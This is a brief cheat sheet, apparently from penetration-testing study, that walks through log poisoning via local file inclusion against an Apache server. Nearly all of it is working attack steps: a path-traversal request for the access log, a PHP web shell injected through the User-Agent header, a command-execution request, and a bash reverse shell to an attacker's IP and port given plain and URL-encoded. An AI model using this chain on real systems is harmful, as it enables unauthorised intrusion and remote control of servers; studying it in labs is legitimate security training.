If you have access to log files, try log poisoning.

1. First, curl the log file to see which header is logged in the file. == curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log

2. Replace that header with this code == "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" >> "Mozilla/5.0 <?php echo system($_GET['cmd']); ?>"

3. Attempt to use the command using a GET like this == /pizza/index.php?page=../../../../../../../../var/log/apache2/access.log&cmd=ls -la

4. If successful, attempt encoded GET request to obtain reverse shell. Remember, php natively uses the bourne again shell so our reverse shell cmd will look a little different == bash -c "bash -i >& /dev/tcp/<yourip>/<yourport> 0>&1" OR bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
